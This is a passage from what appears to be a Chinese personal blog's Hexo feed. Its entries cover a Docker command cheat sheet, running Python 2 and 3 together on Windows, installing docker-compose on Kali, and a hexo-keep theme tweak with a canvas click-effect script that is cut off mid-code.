class="line">docker info#查看docker详细信息</span><br><span class="line">docker --help#查看docker命令</span><br><span class="line"></span><br><span class="line">#镜像命令</span><br><span class="line">docker images#查看docker镜像列表</span><br><span class="line">docker images -a#列出本地所有镜像</span><br><span class="line">docker images --digests#显示镜像的摘要信息</span><br><span class="line">docker search redis#从Docker Hub上查找redis镜像</span><br><span class="line">docker pull redis#从Docker Hub上下载redis镜像</span><br><span class="line">docker rmi 373f0984b070#删除IMAGE ID 为373f0984b070的镜像</span><br><span class="line"></span><br><span class="line">#运行命令</span><br><span class="line">#-p 6379:6379端口映射：前表示主机部分,后表示容器部分</span><br><span class="line">#-d在后台运行容器（不进入终端）并打印容器ID/容器名</span><br><span class="line">#--name myredis表示自定义容器名为myredis</span><br><span class="line">docker run -d -p 6379:6379 --name myredis redis:latest#根据镜像创建并运行容器</span><br><span class="line"></span><br><span class="line">#容器命令</span><br><span class="line">docker container ls 或 docker ps#查看正在运行的容器</span><br><span class="line">docker container ls -a 或 docker ps -a#列出所有容器</span><br><span class="line">docker container start 容器ID 或 容器名称#启动容器</span><br><span class="line">docker start 容器ID 或 容器名称#启动容器</span><br><span class="line">docker container stop 容器ID 或 容器名称#停止容器</span><br><span class="line">docker stop 容器ID 或 容器名称#停止容器</span><br><span class="line">docker container rm 容器ID 或 容器名称#删除容器</span><br><span class="line">docker rm 容器ID 或 容器名称#删除容器</span><br><span class="line">docker container logs -f 容器ID 或 容器名称#查看容器日志</span><br><span class="line">docker exec -it name /bin/bash #进入name（容器名/id）中开启交互式的终端，exit退出</span><br></pre></td></tr></table></figure><h2 id="docker-–help中文译解"><a href="#docker-–help中文译解" class="headerlink" title="docker –help中文译解"></a>docker –help中文译解</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">Usage:</span><br><span class="line">docker [OPTIONS] COMMAND [arg...]</span><br><span class="line">       docker daemon [ --help | ... ]</span><br><span class="line">       docker [ --help | -v | --version ]</span><br><span class="line">A</span><br><span class="line">self-sufficient runtime for containers.</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  --config=~/.docker              Location of client config files  #客户端配置文件的位置</span><br><span class="line">  -D, --debug=false               Enable debug mode  #启用Debug调试模式</span><br><span class="line">  -H, --host=[]                   Daemon socket(s) to connect to  #守护进程的套接字（Socket）连接</span><br><span class="line">  -h, --help=false                Print usage  #打印使用</span><br><span class="line">  -l, --log-level=info            Set the logging level  #设置日志级别</span><br><span class="line">  --tls=false                     Use TLS; implied by--tlsverify  #</span><br><span class="line">  --tlscacert=~/.docker/ca.pem    Trust certs signed only by this CA  #信任证书签名CA</span><br><span class="line">  --tlscert=~/.docker/cert.pem    Path to TLS certificate file  #TLS证书文件路径</span><br><span class="line">  --tlskey=~/.docker/key.pem      Path to TLS key file  #TLS密钥文件路径</span><br><span class="line">  --tlsverify=false               Use TLS and verify the remote  #使用TLS验证远程</span><br><span class="line">  -v, --version=false             Print version information and quit  #打印版本信息并退出</span><br><span class="line"></span><br><span class="line">Commands:</span><br><span class="line">    attach    Attach to a running container  #当前shell下attach连接指定运行镜像</span><br><span class="line">    build     Build an image from a Dockerfile  #通过Dockerfile定制镜像</span><br><span class="line">    commit    Create a new image from a container&#x27;s changes  #提交当前容器为新的镜像</span><br><span class="line">    cp      Copy files/folders from a container to a HOSTDIR or to STDOUT  #从容器中拷贝指定文件或者目录到宿主机中</span><br><span class="line">    create    Create a new container  #创建一个新的容器，同run 但不启动容器</span><br><span class="line">    diff      Inspect changes on a container&#x27;s filesystem  #查看docker容器变化</span><br><span class="line">    events    Get real time events from the server#从docker服务获取容器实时事件</span><br><span class="line">    exec      Run a command in a running container#在已存在的容器上运行命令</span><br><span class="line">    export    Export a container&#x27;s filesystem as a tar archive  #导出容器的内容流作为一个tar归档文件(对应import)</span><br><span class="line">    history   Show the history of an image  #展示一个镜像形成历史</span><br><span class="line">    images    List images  #列出系统当前镜像</span><br><span class="line">    import    Import the contents from a tarball to create a filesystem image  #从tar包中的内容创建一个新的文件系统映像(对应export)</span><br><span class="line">    info      Display system-wide information  #显示系统相关信息</span><br><span class="line">    inspect   Return low-level information on a container or image  #查看容器详细信息</span><br><span class="line">    kill      Kill a running container  #kill指定docker容器</span><br><span class="line">    load      Load an image from a tar archive or STDIN  #从一个tar包中加载一个镜像(对应save)</span><br><span class="line">    login     Register or log in to a Docker registry#注册或者登陆一个docker源服务器</span><br><span class="line">    logout    Log out from a Docker registry  #从当前Docker registry退出</span><br><span class="line">    logs     Fetch the logs of a container  #输出当前容器日志信息</span><br><span class="line">    pause     Pause all processes within a container#暂停容器</span><br><span class="line">    port      List port mappings or a specific mapping for the CONTAINER  #查看映射端口对应的容器内部源端口</span><br><span class="line">    ps      List containers  #列出容器列表</span><br><span class="line">    pull      Pull an image or a repository from a registry  #从docker镜像源服务器拉取指定镜像或者库镜像</span><br><span class="line">    push      Push an image or a repository to a registry  #推送指定镜像或者库镜像至docker源服务器</span><br><span class="line">    rename    Rename a container  #重命名容器</span><br><span class="line">    restart   Restart a running container  #重启运行的容器</span><br><span class="line">    rm      Remove one or more containers  #移除一个或者多个容器</span><br><span class="line">    rmi      Remove one or more images  #移除一个或多个镜像(无容器使用该镜像才可以删除，否则需要删除相关容器才可以继续或者-f强制删除)</span><br><span class="line">    run     Run a command in a new container  #创建一个新的容器并运行一个命令</span><br><span class="line">    save      Save an image(s) to a tar archive#保存一个镜像为一个tar包(对应load)</span><br><span class="line">    search    Search the Docker Hub for images  #在docker</span><br><span class="line">hub中搜索镜像</span><br><span class="line">    start     Start one or more stopped containers#启动容器</span><br><span class="line">    stats     Display a live stream of container(s) resource usage statistics  #统计容器使用资源</span><br><span class="line">    stop      Stop a running container  #停止容器</span><br><span class="line">    tag       Tag an image into a repository  #给源中镜像打标签</span><br><span class="line">    top       Display the running processes of a container #查看容器中运行的进程信息</span><br><span class="line">    unpause   Unpause all processes within a container  #取消暂停容器</span><br><span class="line">    version   Show the Docker version information#查看容器版本号</span><br><span class="line">    wait      Block until a container stops, then print its exit code  #截取容器停止时的退出状态值</span><br></pre></td></tr></table></figure><p>0x07 知识链接<br><a class="link"   href="https://mp.weixin.qq.com/s?__biz=MzI2NjY5NzI0NA==&mid=2247503927&idx=4&sn=965bfa949efabcdc00623846b5430c54&chksm=ea88bf44ddff365281a99dabc1ce4045c2e4a1a464767cc41157e5402016c4ddbd1598d4e25b&mpshare=1&scene=23&srcid=1104UFEN08kUe8zc4TN8L1tK&sharer_sharetime=1636022562934&sharer_shareid=f392cc266ef9fa5f3024edf5fd5135ee#rd" >两小时入门 Docker(快速入门docker)<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://mp.weixin.qq.com/s?__biz=Mzg3OTU4MDQ0Nw==&mid=2247484156&idx=1&sn=ebcc8f7c1659f67c00b02795e1d0d95b&chksm=cf03068cf8748f9aa6d677a9cdc25618cc6a1fabaa942b4561f08981565bdb084925109d218a&mpshare=1&scene=23&srcid=11045CxASpR3mALNpaNPImCt&sharer_sharetime=1636022780005&sharer_shareid=f392cc266ef9fa5f3024edf5fd5135ee#rd" >工具篇|kali linux中docker安装及应用<i class="fas fa-external-link-alt"></i></a></p><p>本文转载自：<a class="link"   href="https://blog.csdn.net/weixin_46318141/article/details/121168812" >https://blog.csdn.net/weixin_46318141/article/details/121168812<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Docker的简单使用&quot;&gt;&lt;a href=&quot;#Docker的简单使用&quot; class=&quot;headerlink&quot; title=&quot;Docker的简单使用&quot;&gt;&lt;/a&gt;Docker的简单使用&lt;/h2&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table</summary>
      
    
    
    
    <category term="docker" scheme="https://idealyth.github.io/blog/categories/docker/"/>
    
    
    <category term="docker" scheme="https://idealyth.github.io/blog/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>windows下python2和python3共存方法</title>
    <link href="https://idealyth.github.io/blog/posts/554823524.html"/>
    <id>https://idealyth.github.io/blog/posts/554823524.html</id>
    <published>2022-04-08T08:53:39.000Z</published>
    <updated>2025-01-03T05:44:08.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="第一种改名法："><a href="#第一种改名法：" class="headerlink" title="第一种改名法："></a>第一种改名法：</h2><ol><li><p>将python2和3安装到不同路径，因为环境变量只能添加一个版本，所以另一个版本的环境变量需要手动添加</p></li><li><p>把两个安装目录下的python.exe分别改成python2.exe,python3.exe</p></li><li><p>pip版本共存：分别执行下面的语句，即可实现2个版本pip共存</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python2 -m pip install --upgrade pip --force-reinstall</span><br><span class="line">python3 -m pip install --upgrade pip --force-reinstall </span><br></pre></td></tr></table></figure></li><li><p>平常使用哪个py程序，就用相应的版本命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 xxx.py</span><br><span class="line">python2 xxx.py</span><br></pre></td></tr></table></figure></li><li><p>对应的pip安装命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip2 install xxx</span><br><span class="line">pip3 install xxx</span><br></pre></td></tr></table></figure></li></ol><h2 id="第二种官方法："><a href="#第二种官方法：" class="headerlink" title="第二种官方法："></a>第二种官方法：</h2><p>在Python3（&gt;&#x3D;3.3）时，在文件夹C:\Windows\下面，python实际上安装了一个启动器py.exe</p><ol><li><p>使用解释器运行程序命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">py -2 xxx.py</span><br><span class="line">py -3 xxx.py</span><br></pre></td></tr></table></figure></li><li><p>使用pip安装包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">py -2 -m pip install XXXX</span><br><span class="line">py -3 -m pip install XXXX</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;第一种改名法：&quot;&gt;&lt;a href=&quot;#第一种改名法：&quot; class=&quot;headerlink&quot; title=&quot;第一种改名法：&quot;&gt;&lt;/a&gt;第一种改名法：&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;将python2和3安装到不同路径，因为环境变量只能添加一个版本，所以另一个版本的</summary>
      
    
    
    
    <category term="python" scheme="https://idealyth.github.io/blog/categories/python/"/>
    
    
    <category term="python" scheme="https://idealyth.github.io/blog/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Kali下安装docker和docker-compose</title>
    <link href="https://idealyth.github.io/blog/posts/4220737426.html"/>
    <id>https://idealyth.github.io/blog/posts/4220737426.html</id>
    <published>2022-04-07T18:47:57.000Z</published>
    <updated>2025-01-03T05:44:08.000Z</updated>
    
    <content type="html"><![CDATA[<p>因为一直文件下载失败，所以直接在github上下载下来，在移到虚拟机里。</p><p>github地址：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/docker/compose/releases</span><br></pre></td></tr></table></figure><p>然后执行命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo DOCKER_CONFIG=$&#123;DOCKER_CONFIG:-$HOME/.docker&#125;  //跟着官方文档来的</span><br><span class="line">sudo mkdir -p mkdir -p /usr/local/lib/docker/cli-plugins  //创建多层目录</span><br><span class="line">sudo mv docker-compose-linux-x86_64 /usr/local/lib/docker/cli-plugins/docker-compose    //把文件移到指定目录下并更名为docker-compose</span><br></pre></td></tr></table></figure><p>对二进制文件应用可执行权限：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod +x /usr/local/lib/docker/cli-plugins/docker-compose</span><br></pre></td></tr></table></figure><p>测试是够安装成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker compose version</span><br><span class="line">Docker Compose version v2.4.1</span><br></pre></td></tr></table></figure><p>kali账户的权限太低了，基本啥命令都得加个sudo，太烦了，得直接给他提升到root权限</p><p>小白刚接触kali和docker，安装一个这个，就捣鼓了一下午，太难了实在。</p><p>—————————————–以下更新于2022-4-8——————————————————-</p><p>突然发现这个命令可以一键安装docker和docker-compose</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install docker docker-compose</span><br></pre></td></tr></table></figure><p>这么方便，让我手动搞了那么长时间，具体有什么区别暂时咱也不了解。。。</p><p>这个模板怎么连个文章更新时间实时也没，太难了。</p><p>知识链接：<a class="link"   href="https://yeasy.gitbook.io/docker_practice/" >Docker — 从入门到实践<i class="fas fa-external-link-alt"></i></a></p><p>​<a class="link"   href="https://www.runoob.com/docker/debian-docker-install.html" >菜鸟教程<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;因为一直文件下载失败，所以直接在github上下载下来，在移到虚拟机里。&lt;/p&gt;
&lt;p&gt;github地址：&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span cl</summary>
      
    
    
    
    <category term="kali" scheme="https://idealyth.github.io/blog/categories/kali/"/>
    
    
    <category term="docker" scheme="https://idealyth.github.io/blog/tags/docker/"/>
    
    <category term="kali" scheme="https://idealyth.github.io/blog/tags/kali/"/>
    
  </entry>
  
  <entry>
    <title>hexo-keep主题美化</title>
    <link href="https://idealyth.github.io/blog/posts/225088152.html"/>
    <id>https://idealyth.github.io/blog/posts/225088152.html</id>
    <published>2022-04-03T12:47:23.000Z</published>
    <updated>2025-01-03T05:44:08.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h2><p><strong>利用inject注入美化主题，后续就可以平滑升级了</strong></p><p>首先打开主题配置文件中的inject，并添加如下内容</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">inject:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span>  <span class="comment"># Option values: true | false</span></span><br><span class="line">  <span class="attr">css:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">/css/custom-1.css</span></span><br><span class="line">    <span class="comment"># e.g.</span></span><br><span class="line">    <span class="comment"># - /css/custom-1.css</span></span><br><span class="line">    <span class="comment"># - /css/custom-2.css</span></span><br><span class="line">    <span class="comment"># - ...</span></span><br><span class="line">  <span class="attr">js:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">/js/fireworks.js</span></span><br></pre></td></tr></table></figure><p><strong>鼠标点击效果</strong></p><p>在hexo根目录下的source文件夹下新建js文件夹。创建fireworks.js文件，并加入如下代码:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 更新坐标</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">updateCoords</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    pointerX = (e.<span class="property">clientX</span> || e.<span class="property">touches</span>[<span class="number">0</span>].<span class="property">clientX</span>) - canvasEl.<span class="title function_">getBoundingClientRect</span>().<span class="property">left</span>;</span><br><span class="line">    pointerY = (e.<span class="property">clientY</span> || e.<span class="property">touches</span>[<span class="number">0</span>].<span class="property">clientY</span>) - canvasEl.<span class="title function_">getBoundingClientRect</span>().<span class="property">top</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置粒子方向</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">setParticuleDirection</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> angle = anime.<span class="title function_">random</span>(<span class="number">0</span>, <span class="number">360</span>) * <span class="title class_">Math</span>.<span class="property">PI</span> / <span class="number">180</span>;</span><br><span class="line">    <span class="keyword">var</span> value = anime.<span class="title function_">random</span>(<span class="number">50</span>, <span class="number">180</span>);</span><br><span class="line">    <span class="keyword">var</span> direction = [-<span class="number">1</span>, <span class="number">1</span>][anime.<span class="title function_">random</span>(<span class="number">0</span>, <span class="number">1</span>)] * value;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="attr">x</span>: e.<span class="property">x</span> + direction * <span class="title class_">Math</span>.<span class="title function_">cos</span>(angle),</span><br><span class="line">        <span class="attr">y</span>: e.<span class="property">y</span> + direction * <span class="title class_">Math</span>.<span class="title function_">sin</span>(angle)</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建粒子</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createParticule</span>(<span class="params">x, y</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> p = &#123;&#125;;</span><br><span class="line">    p.<span class="property">x</span> = x;</span><br><span class="line">    p.<span class="property">y</span> = y;</span><br><span class="line">    p.<span class="property">color</span> = colors[anime.<span class="title function_">random</span>(<span class="number">0</span>, colors.<span class="property">length</span> - <span class="number">1</span>)];</span><br><span class="line">    p.<span class="property">radius</span> = anime.<span class="title function_">random</span>(<span class="number">16</span>, <span class="number">32</span>);</span><br><span class="line">    p.<span class="property">endPos</span> = <span class="title function_">setParticuleDirection</span>(p);</span><br><span class="line">    p.<span class="property">draw</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        ctx.<span class="title function_">beginPath</span>();</span><br><span class="line">        ctx.<span class="title function_">arc</span>(p.<span class="property">x</span>, p.<span class="property">y</span>, p.<span class="property">radius</span>, <span class="number">0</span>, <span class="number">2</span> * <span class="title class_">Math</span>.<span class="property">PI</span>, <span class="literal">true</span>);</span><br><span class="line">        ctx.<span class="property">fillStyle</span> = p.<span class="property">color</span>;</span><br><span class="line">        ctx.<span class="title function_">fill</span>();</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建圆圈</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createCircle</span>(<span class="params">x, y</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> c = &#123;&#125;;</span><br><span class="line">    c.<span class="property">x</span> = x;</span><br><span class="line">    c.<span class="property">y</span> = y;</span><br><span class="line">    c.<span class="property">color</span> = <span class="string">&quot;#F00&quot;</span>;</span><br><span class="line">    c.<span class="property">radius</span> = <span class="number">0.1</span>;</span><br><span class="line">    c.<span class="property">alpha</span> = <span class="number">0.5</span>;</span><br><span class="line">    c.<span class="property">lineWidth</span> = <span class="number">6</span>;</span><br><span class="line">    c.<span class="property">draw</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        ctx.<span class="property">globalAlpha</span> = c.<span class="property">alpha</span>;</span><br><span class="line">        ctx.<span class="title function_">beginPath</span>();</span><br><span class="line">        ctx.<span class="title function_">arc</span>(c.<span class="property">x</span>, c.<span class="property">y</span>, c.<span class="property">radius</span>, <span class="number">0</span>, <span class="number">2</span> * <span class="title class_">Math</span>.<span class="property">PI</span>, <span class="literal">true</span>);</span><br><span class="line">        ctx.<span class="property">lineWidth</span> = c.<span class="property">lineWidth</span>;</span><br><span class="line">        ctx.<span class="property">strokeStyle</span> = c.<span class="property">color</span>;</span><br><span class="line">        ctx.<span class="title function_">stroke</span>();</span><br><span class="line">        ctx.<span class="property">globalAlpha</span> = <span class="number">1</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 渲染粒子</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">renderParticule</span>(<span class="params">anim</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; anim.<span class="property">animatables</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        anim.<span class="property">animatables</span>[i].<span class="property">target</span>.<span class="title function_">draw</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 动画粒子</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">animateParticules</span>(<span class="params">x, y</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> circle = <span class="title function_">createCircle</span>(x, y);</span><br><span class="line">    <span class="keyword">var</span> particules = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; numberOfParticules; i++) &#123;</span><br><span class="line">        particules.<span class="title function_">push</span>(<span class="title function_">createParticule</span>(x, y));</span><br><span class="line">    &#125;</span><br><span class="line">    anime.<span class="title function_">timeline</span>().<span class="title function_">add</span>(&#123;</span><br><span class="line">        <span class="attr">targets</span>: particules,</span><br><span class="line">        <span class="attr">x</span>: <span class="keyword">function</span> (<span class="params">p</span>) &#123; <span class="keyword">return</span> p.<span class="property">endPos</span>.<span class="property">x</span>; &#125;,</span><br><span class="line">        <span class="attr">y</span>: <span class="keyword">function</span> (<span class="params">p</span>) &#123; <span class="keyword">return</span> p.<span class="property">endPos</span>.<span class="property">y</span>; &#125;,</span><br><span class="line">        <span class="attr">radius</span>: <span class="number">0.1</span>,</span><br><span class="line">        <span class="attr">duration</span>: anime.<span class="title function_">random</span>(<span class="number">1200</span>, <span class="number">1800</span>),</span><br><span class="line">        <span class="attr">easing</span>: <span class="string">&quot;easeOutExpo&quot;</span>,</span><br><span class="line">        <span class="attr">update</span>: renderParticule</span><br><span class="line">    &#125;).<span class="title function_">add</span>(&#123;</span><br><span class="line">        <span class="attr">targets</span>: circle,</span><br><span class="line">        <span class="attr">radius</span>: anime.<span class="title function_">random</span>(<span class="number">80</span>, <span class="number">160</span>),</span><br><span class="line">        <span class="attr">lineWidth</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">alpha</span>: &#123; <span class="attr">value</span>: <span class="number">0</span>, <span class="attr">easing</span>: <span class="string">&quot;linear&quot;</span>, <span class="attr">duration</span>: anime.<span class="title function_">random</span>(<span class="number">600</span>, <span class="number">800</span>) &#125;,</span><br><span class="line">        <span class="attr">duration</span>: anime.<span class="title function_">random</span>(<span class="number">1200</span>, <span class="number">1800</span>),</span><br><span class="line">        <span class="attr">easing</span>: <span class="string">&quot;easeOutExpo&quot;</span>,</span><br><span class="line">        <span class="attr">update</span>: renderParticule,</span><br><span class="line">        <span class="attr">offset</span>: <span class="number">0</span></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 防抖函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">debounce</span>(<span class="params">func, wait</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> timeout;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> context = <span class="variable language_">this</span>, args = <span class="variable language_">arguments</span>;</span><br><span class="line">        <span class="built_in">clearTimeout</span>(timeout);</span><br><span class="line">        timeout = <span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            func.<span class="title function_">apply</span>(context, args);</span><br><span class="line">        &#125;, wait);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化</span></span><br><span class="line"><span class="keyword">var</span> canvasEl = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;.fireworks&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (canvasEl) &#123;</span><br><span class="line">    <span class="keyword">var</span> ctx = canvasEl.<span class="title function_">getContext</span>(<span class="string">&quot;2d&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> numberOfParticules = <span class="number">30</span>;</span><br><span class="line">    <span class="keyword">var</span> pointerX = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">var</span> pointerY = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">var</span> tap = <span class="string">&quot;mousedown&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> colors = [<span class="string">&quot;#FF1461&quot;</span>, <span class="string">&quot;#18FF92&quot;</span>, <span class="string">&quot;#5A87FF&quot;</span>, <span class="string">&quot;#FBF38C&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> setCanvasSize = <span class="title 